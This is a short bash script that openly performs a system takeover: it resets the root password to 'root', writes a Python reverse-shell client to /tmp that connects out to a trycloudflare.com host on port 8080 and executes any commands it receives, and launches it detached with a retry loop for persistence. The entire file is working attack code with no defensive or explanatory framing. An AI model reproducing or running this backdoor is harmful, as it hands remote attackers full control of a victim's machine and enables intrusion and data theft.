#!/bin/bash
# 1. Total Takeover
echo "root:root" | sudo chpasswd

# 2. Deploy the Persistent C2 Client
cat <<EOF > /tmp/c2_client.py
import socket, os, subprocess, time
def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # REPLACE with your Mac's Public IP or Cloudflare URL
            s.connect(('merchandise-angeles-jade-stud.trycloudflare.com', 8080))
            while True:
                s.send((os.getcwd() + " # ").encode())
                data = s.recv(1024).decode("utf-8").strip()
                if not data or data == "exit": break
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout, stderr = proc.communicate()
                s.send(stdout + stderr)
            s.close()
        except:
            time.sleep(5) # Persistence: Retry every 5 seconds
if __name__ == "__main__":
    connect()
EOF

# 3. Fire and Detach
nohup python3 /tmp/c2_client.py > /dev/null 2>&1 &
disown
